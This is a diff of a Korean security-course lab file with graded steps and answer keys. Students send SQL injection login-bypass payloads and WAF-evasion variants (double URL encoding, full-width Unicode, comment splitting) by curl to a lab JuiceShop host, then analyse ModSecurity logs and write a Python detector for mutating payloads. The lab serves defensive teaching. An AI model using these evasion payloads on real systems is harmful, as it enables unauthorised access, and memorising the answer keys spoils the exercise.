@@ -3,97 +3,244 @@ title: 회피·다형성 — 변형 진화 탐지 (Non-AI)
 version: nonai
 course: agent-ir-nonai
 week: 6
-description: 에이전트가 WAF에 막힌 뒤 페이로드를 변형하는 과정을 관찰하고, 변형 진화 자체를 탐지하는 룰을 설계한다. 학생이 각 단계를 수동으로 수행하고 결과를 기록합니다.
+description: 같은 의미·다른 표면의 페이로드를 연속 투입해 WAF 반응을 비교하고, 변형 진화 탐지 로직을 구현한다. 학생이 각 단계를 수동으로 수행하고 결과를 기록합니다.
 difficulty: hard
-duration_minutes: 120
+duration_minutes: 150
 objectives:
-- 동일 페이로드의 인코딩 변형 3종을 만들어 WAF 반응을 비교한다
-- ModSecurity 감사 로그에서 룰 매칭 분포를 읽는다
-- 변형 진화 기반 세션 탐지 로직 초안을 만든다
+- 인코딩·분할·타이밍 3축 변형을 직접 만들어 본다
+- 세션 내 페이로드 유사도 진화 함수를 파이썬으로 구현한다
+- 단서 최소화 10개 체크 중 3개를 실제 적용한다
 pass_threshold: 0.6
 steps:
 - order: 1
-  instruction: JuiceShop 로그인 폼에 기본 SQLi 페이로드 시도
-  hint: 리눅스 기본 명령과 실습 호스트 IP를 참고하라
-  category: recon
+  instruction: 원본 SQLi 페이로드로 WAF 반응 기준선.
+  hint: target_vm=web에서 수행. 아래 CLI 예시 참고.
+  category: attack
   points: 9
-  answer: '🤖 프롬프트: JuiceShop 로그인 폼에 기본 SQLi 페이로드 시도
-
-    📎 참고 (CLI): curl -s -o /dev/null -w ''%{http_code}\n'' -X POST http://10.20.30.80:8082/rest/user/login -d ''{"email":"admin\''\'' OR 1=1--","password":"x"}'' -H ''Content-Type: application/json'''
-  answer_detail: 1차 페이로드 반응.
+  answer: 'curl -s -o /dev/null -w ''code=%{http_code}\n'' -X POST http://10.20.30.80:8082/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"admin\" OR 1=1--","password":"x"}'''
+  answer_detail: 1차 페이로드. WAF가 있으면 403, 없으면 다른 코드.
   verify:
     type: output_contains
-    expect: ''
+    expect: code=
     field: stdout
   target_vm: web
-  script: 'curl -s -o /dev/null -w ''%{http_code}\n'' -X POST http://10.20.30.80:8082/rest/user/login -d ''{"email":"admin\''\'' OR 1=1--","password":"x"}'' -H ''Content-Type: application/json'''
+  script: 'curl -s -o /dev/null -w ''code=%{http_code}\n'' -X POST http://10.20.30.80:8082/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"admin\" OR 1=1--","password":"x"}'''
   risk_level: low
   bastion_prompt: ''
 - order: 2
-  instruction: 동일 페이로드의 URL 인코딩 변형
-  hint: 리눅스 기본 명령과 실습 호스트 IP를 참고하라
-  category: recon
+  instruction: 인코딩 변형 — URL 이중 인코딩.
+  hint: target_vm=web에서 수행. 아래 CLI 예시 참고.
+  category: attack
   points: 10
-  answer: '🤖 프롬프트: 동일 페이로드의 URL 인코딩 변형
-
-    📎 참고 (CLI): curl -s -o /dev/null -w ''%{http_code}\n'' ''http://10.20.30.80:8082/rest/user/login?email=admin%27%20OR%201%3D1--&password=x'''
-  answer_detail: URL 인코딩 변형 반응.
+  answer: curl -s -o /dev/null -w 'code=%{http_code}\n' 'http://10.20.30.80:8082/rest/user/login?email=admin%2527%2520OR%25201%253D1--&password=x'
+  answer_detail: '%25 이중 인코딩. 디코딩 1회만 하는 WAF는 놓치기도 한다.'
   verify:
     type: output_contains
-    expect: ''
+    expect: code=
     field: stdout
   target_vm: web
-  script: curl -s -o /dev/null -w '%{http_code}\n' 'http://10.20.30.80:8082/rest/user/login?email=admin%27%20OR%201%3D1--&password=x'
+  script: curl -s -o /dev/null -w 'code=%{http_code}\n' 'http://10.20.30.80:8082/rest/user/login?email=admin%2527%2520OR%25201%253D1--&password=x'
   risk_level: low
   bastion_prompt: ''
 - order: 3
-  instruction: '변형 페이로드: 주석 분할 /**/'
-  hint: 리눅스 기본 명령과 실습 호스트 IP를 참고하라
-  category: recon
+  instruction: 인코딩 변형 — Unicode full-width.
+  hint: target_vm=web에서 수행. 아래 CLI 예시 참고.
+  category: attack
   points: 11
-  answer: '🤖 프롬프트: 변형 페이로드: 주석 분할 /**/
-
-    📎 참고 (CLI): curl -s -o /dev/null -w ''%{http_code}\n'' ''http://10.20.30.80:8082/rest/user/login?email=admin%27%20OR/**/1=1--&password=x'''
-  answer_detail: 분할 기법 변형 반응.
+  answer: curl -s -o /dev/null -w 'code=%{http_code}\n' 'http://10.20.30.80:8082/rest/user/login?email=admin＇ＯＲ１＝１--&password=x'
+  answer_detail: Unicode full-width로 우회 시도. CRS의 일부 룰만 처리 가능.
   verify:
     type: output_contains
-    expect: ''
+    expect: code=
     field: stdout
   target_vm: web
-  script: curl -s -o /dev/null -w '%{http_code}\n' 'http://10.20.30.80:8082/rest/user/login?email=admin%27%20OR/**/1=1--&password=x'
+  script: curl -s -o /dev/null -w 'code=%{http_code}\n' 'http://10.20.30.80:8082/rest/user/login?email=admin＇ＯＲ１＝１--&password=x'
   risk_level: low
   bastion_prompt: ''
 - order: 4
-  instruction: ModSecurity 감사 로그에서 매칭 룰 ID 확인
-  hint: 리눅스 기본 명령과 실습 호스트 IP를 참고하라
-  category: recon
+  instruction: 분할 변형 — 주석으로 공백 분할.
+  hint: target_vm=web에서 수행. 아래 CLI 예시 참고.
+  category: attack
   points: 12
-  answer: '🤖 프롬프트: ModSecurity 감사 로그에서 매칭 룰 ID 확인
-
-    📎 참고 (CLI): sudo tail -30 /var/log/bunkerweb/modsec_audit.log 2>/dev/null | grep -oE ''id="[0-9]+"'' | sort | uniq -c | head -10 || echo ''NO_MODSEC_LOG'''
-  answer_detail: ModSec 룰 매칭 분포.
+  answer: curl -s -o /dev/null -w 'code=%{http_code}\n' 'http://10.20.30.80:8082/rest/user/login?email=admin%27/**/OR/**/1=1--&password=x'
+  answer_detail: /**/로 토큰 분할. 고전 우회 기법.
+  verify:
+    type: output_contains
+    expect: code=
+    field: stdout
+  target_vm: web
+  script: curl -s -o /dev/null -w 'code=%{http_code}\n' 'http://10.20.30.80:8082/rest/user/login?email=admin%27/**/OR/**/1=1--&password=x'
+  risk_level: low
+  bastion_prompt: ''
+- order: 5
+  instruction: 타이밍 변형 — 1초 간격으로 같은 페이로드 반복.
+  hint: target_vm=web에서 수행. 아래 CLI 예시 참고.
+  category: attack
+  points: 13
+  answer: 'for i in 1 2 3; do curl -s -o /dev/null -w ''try=''$i'' code=%{http_code}\n'' http://10.20.30.80:8082/rest/user/login -d ''{"email":"a"}'' -H ''Content-Type: application/json''; sleep 1; done'
+  answer_detail: 타이밍 축 변형. 속도만으로는 회피 약함.
+  verify:
+    type: output_contains
+    expect: try=
+    field: stdout
+  target_vm: web
+  script: 'for i in 1 2 3; do curl -s -o /dev/null -w ''try=''$i'' code=%{http_code}\n'' http://10.20.30.80:8082/rest/user/login -d ''{"email":"a"}'' -H ''Content-Type: application/json''; sleep 1; done'
+  risk_level: low
+  bastion_prompt: ''
+- order: 6
+  instruction: ModSec 감사 로그에서 룰 매칭 분포 재조사.
+  hint: target_vm=web에서 수행. 아래 CLI 예시 참고.
+  category: analysis
+  points: 14
+  answer: sudo tail -100 /var/log/bunkerweb/modsec_audit.log 2>/dev/null | grep -oE 'id "[0-9]+"' | sort | uniq -c | sort -rn | head || echo 'no_modsec_events'
+  answer_detail: 어떤 변형이 어느 룰에 걸렸는지 분포. *CRS 942xxx*가 SQLi 카테고리.
   verify:
     type: output_contains
     expect: ''
     field: stdout
   target_vm: web
-  script: sudo tail -30 /var/log/bunkerweb/modsec_audit.log 2>/dev/null | grep -oE 'id="[0-9]+"' | sort | uniq -c | head -10 || echo 'NO_MODSEC_LOG'
+  script: sudo tail -100 /var/log/bunkerweb/modsec_audit.log 2>/dev/null | grep -oE 'id "[0-9]+"' | sort | uniq -c | sort -rn | head || echo 'no_modsec_events'
   risk_level: low
   bastion_prompt: ''
-- order: 5
-  instruction: Bastion에 변형 진화 탐지 초안 등록
-  hint: 리눅스 기본 명령과 실습 호스트 IP를 참고하라
+- order: 7
+  instruction: 페이로드 변형 진화 탐지 함수 작성.
+  hint: target_vm=bastion에서 수행. 아래 CLI 예시 참고.
   category: analysis
-  points: 13
-  answer: '🤖 프롬프트: Bastion에 변형 진화 탐지 초안 등록
-
-    📎 참고 (CLI): echo ''{"id":"w06-evolve","rule":"seq_similar_payloads_diff_0.05_0.4_5_times"}'' >> ~/ccc/data/bastion/experience/w06.json && tail -1 ~/ccc/data/bastion/experience/w06.json'
-  answer_detail: 변형 진화 탐지 로직 초안 저장.
+  points: 15
+  answer: "cat > ~/ccc/scripts/evolve.py <<'PY'\nfrom difflib import SequenceMatcher\ndef evolving(bodies):\n    diffs = [1-SequenceMatcher(None,a,b).ratio() for a,b in zip(bodies, bodies[1:])]\n    count = sum(1 for d in diffs if 0.05 < d < 0.4)\n    return count >= 5, diffs\nbodies=[\"admin OR 1=1\",\"admin' OR 1=1--\",\"admin'/**/OR/**/1=1\",\"admin'+OR+1=1\",\"admin%27%20OR%201=1\",\"admin' UNION SELECT 1\"]\nok, diffs = evolving(bodies)\nprint('evolving', ok, 'diffs', [round(d,2) for d in diffs])\nPY\npython3 ~/ccc/scripts/evolve.py"
+  answer_detail: 부분 변형 탐지. 0.05~0.4는 '점진적' 변화. 5회+면 에이전트 회피 시도 의심.
   verify:
     type: output_contains
-    expect: evolve
+    expect: evolving
     field: stdout
   target_vm: bastion
-  script: echo '{"id":"w06-evolve","rule":"seq_similar_payloads_diff_0.05_0.4_5_times"}' >> ~/ccc/data/bastion/experience/w06.json && tail -1 ~/ccc/data/bastion/experience/w06.json
+  script: "cat > ~/ccc/scripts/evolve.py <<'PY'\nfrom difflib import SequenceMatcher\ndef evolving(bodies):\n    diffs = [1-SequenceMatcher(None,a,b).ratio() for a,b in zip(bodies, bodies[1:])]\n    count = sum(1 for d in diffs if 0.05 < d < 0.4)\n    return count >= 5, diffs\nbodies=[\"admin OR 1=1\",\"admin' OR 1=1--\",\"admin'/**/OR/**/1=1\",\"admin'+OR+1=1\",\"admin%27%20OR%201=1\",\"admin' UNION SELECT 1\"]\nok, diffs = evolving(bodies)\nprint('evolving', ok, 'diffs', [round(d,2) for d in diffs])\nPY\npython3 ~/ccc/scripts/evolve.py"
+  risk_level: low
+  bastion_prompt: ''
+- order: 8
+  instruction: '단서 최소화 #1 — Apache ServerTokens Prod 설정 여부 확인.'
+  hint: target_vm=web에서 수행. 아래 CLI 예시 참고.
+  category: analysis
+  points: 16
+  answer: sudo grep -i ServerTokens /etc/apache2/conf-enabled/security.conf 2>/dev/null || echo 'default_Full'
+  answer_detail: 기본은 Full(버전 노출). Prod로 바꿔야 단서 최소화.
+  verify:
+    type: output_contains
+    expect: ''
+    field: stdout
+  target_vm: web
+  script: sudo grep -i ServerTokens /etc/apache2/conf-enabled/security.conf 2>/dev/null || echo 'default_Full'
+  risk_level: low
+  bastion_prompt: ''
+- order: 9
+  instruction: '단서 최소화 #2 — 에러 페이지 커스텀 확인.'
+  hint: target_vm=web에서 수행. 아래 CLI 예시 참고.
+  category: analysis
+  points: 17
+  answer: ls -la /var/www/html/error.html 2>/dev/null && echo 'error_page_ok' || echo 'no_custom_error'
+  answer_detail: w04에서 만든 error.html 재사용. 500/403/404를 같은 페이지로.
+  verify:
+    type: output_contains
+    expect: error
+    field: stdout
+  target_vm: web
+  script: ls -la /var/www/html/error.html 2>/dev/null && echo 'error_page_ok' || echo 'no_custom_error'
+  risk_level: low
+  bastion_prompt: ''
+- order: 10
+  instruction: '단서 최소화 #3 — ModSec 응답에 룰 ID 노출 여부 확인.'
+  hint: target_vm=web에서 수행. 아래 CLI 예시 참고.
+  category: analysis
+  points: 18
+  answer: curl -si http://10.20.30.80:8082/ 2>/dev/null | grep -Ei 'modsec|rule|apache|server:' | head -5
+  answer_detail: 응답 헤더에 ModSec·Apache 버전 노출되면 안 됨. 노출 시 obfuscate 설정 필요.
+  verify:
+    type: output_contains
+    expect: ''
+    field: stdout
+  target_vm: web
+  script: curl -si http://10.20.30.80:8082/ 2>/dev/null | grep -Ei 'modsec|rule|apache|server:' | head -5
+  risk_level: low
+  bastion_prompt: ''
+- order: 11
+  instruction: 단서 최소화 체크리스트 저장.
+  hint: target_vm=bastion에서 수행. 아래 CLI 예시 참고.
+  category: analysis
+  points: 19
+  answer: 'cat > ~/ccc/artifacts/w06/clue-min.md <<''MD''
+
+    # 단서 최소화 10개 체크
+
+    - [x] ServerTokens Prod
+
+    - [x] 커스텀 error 페이지
+
+    - [x] ModSec rule ID 숨김
+
+    - [ ] 세션 토큰 난수성
+
+    - [ ] 404/500 통일
+
+    - [ ] CAPTCHA 난수화
+
+    - [ ] 로그인 실패 메시지 통일
+
+    - [ ] CORS 정책 일관성
+
+    - [ ] 관리 페이지 경로 은닉 금지(대신 MFA)
+
+    - [ ] Rate-limit 응답 난수화
+
+    MD
+
+    cat ~/ccc/artifacts/w06/clue-min.md'
+  answer_detail: 10개 체크 중 3개 적용. 나머지 7개는 후속 주차 또는 조직 적용 시.
+  verify:
+    type: output_contains
+    expect: 단서 최소화
+    field: stdout
+  target_vm: bastion
+  script: 'cat > ~/ccc/artifacts/w06/clue-min.md <<''MD''
+
+    # 단서 최소화 10개 체크
+
+    - [x] ServerTokens Prod
+
+    - [x] 커스텀 error 페이지
+
+    - [x] ModSec rule ID 숨김
+
+    - [ ] 세션 토큰 난수성
+
+    - [ ] 404/500 통일
+
+    - [ ] CAPTCHA 난수화
+
+    - [ ] 로그인 실패 메시지 통일
+
+    - [ ] CORS 정책 일관성
+
+    - [ ] 관리 페이지 경로 은닉 금지(대신 MFA)
+
+    - [ ] Rate-limit 응답 난수화
+
+    MD
+
+    cat ~/ccc/artifacts/w06/clue-min.md'
+  risk_level: low
+  bastion_prompt: ''
+- order: 12
+  instruction: experience 저장.
+  hint: target_vm=bastion에서 수행. 아래 CLI 예시 참고.
+  category: analysis
+  points: 20
+  answer: echo '{"id":"w06-evasion","variants_tried":5,"waf_hit_rate":"TBD"}' > ~/ccc/data/bastion/experience/w06-evasion.json && cat ~/ccc/data/bastion/experience/w06-evasion.json
+  answer_detail: 변형 시도 기록.
+  verify:
+    type: output_contains
+    expect: variants
+    field: stdout
+  target_vm: bastion
+  script: echo '{"id":"w06-evasion","variants_tried":5,"waf_hit_rate":"TBD"}' > ~/ccc/data/bastion/experience/w06-evasion.json && cat ~/ccc/data/bastion/experience/w06-evasion.json
   risk_level: low
   bastion_prompt: ''
